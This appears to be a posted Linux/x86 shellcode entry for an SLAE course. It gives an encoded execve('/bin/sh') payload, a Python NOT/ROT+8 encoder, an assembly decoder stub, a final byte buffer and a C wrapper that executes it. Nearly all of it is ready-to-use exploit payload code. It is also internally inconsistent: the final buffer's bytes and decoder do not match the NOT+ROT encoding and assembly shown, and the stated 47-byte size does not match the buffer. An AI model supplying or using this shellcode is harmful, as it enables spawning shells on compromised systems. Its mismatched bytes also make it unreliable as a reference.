# Title: Linux/x86 (NOT|ROT+8 Encoded) execve(/bin/sh) null-free Shellcode (47 bytes)
# Author: Daniel Ortiz
# Date: 2019-10-30
# Tested on: Linux 4.18.0-25-generic #26 Ubuntu
# Size: 47 bytes
# SLAE ID: PA-9844

#----------------------- execve ------------------------------------------------#

global _start

section .text

_start:

        xor eax, eax
        push eax

        ; PUSH //bin/sh (8 bytes)

        push 0x68732f2f
        push 0x6e69622f
        mov ebx, esp

        push eax
        mov edx, esp

        push ebx
        mov ecx, esp

        mov al, 11
        int 0x80

#------------------------ execve shellcode -------------------------------------#

"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

#----------------------- Python Encoder ----------------------------------------#

#!/usr/bin/python

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

encoded = ""
encoded2 = ""

rot = 8

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :
        # NOT encoding
        y = ~x

        # ROT 8 encoding
        h  = (y + rot)%256

        encoded += '\\x'
        encoded += '%02x' % (h & 0xff)

        encoded2 += '0x'
        encoded2 += '%02x,' %(h & 0xff)


print encoded

print encoded2

print 'Len: %d' % len(bytearray(shellcode))

#---------------------- Assembly Code ------------------------------------------#


global _start

section .text
_start:
        jmp short call_shellcode

decoder:
        pop esi
        xor ecx, ecx
        mov cl, 25


decode:

        sub byte [esi], 8
        not byte [esi]
        inc esi
        loop decode

        jmp short EncodedShellcode

call_shellcode:

        call decoder

        EncodedShellcode: db 0xd6,0x47,0xb7,0x9f,0xd8,0xd8,0x94,0x9f,0x9f,0xd8,0xa5,0x9e,0x99,0x7e,0x24,0xb7,0x7e,0x25,0xb4,0x7e,0x26,0x57,0xfc,0x3a,0x87

#------------------------- final shellcode ----------------------------------------#

unsigned char buf[] =


"\xeb\x0f\x5e\x31\xc0\xb0\x19\x80\x2e\x08\xfe"
"\xc8\x74\x08\x46\xeb\xf6\xe8\xec\xff\xff\xff"
"\x39\xc8\x58\x70\x37\x37\x7b\x70\x70\x37\x6a"
"\x71\x76\x91\xeb\x58\x91\xea\x5b\x91\xe9\xb8"
"\x13\x88";

#------------------------- C wrapper --------------------------------------------------#

#include<stdio.h>
#include<string.h>

unsigned char code[] = \

"\xeb\x0f\x5e\x31\xc0\xb0\x19\x80\x2e\x08\xfe"
"\xc8\x74\x08\x46\xeb\xf6\xe8\xec\xff\xff\xff"
"\x39\xc8\x58\x70\x37\x37\x7b\x70\x70\x37\x6a"
"\x71\x76\x91\xeb\x58\x91\xea\x5b\x91\xe9\xb8"
"\x13\x88";


int main()
{

        printf("Shellcode Length:  %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();

}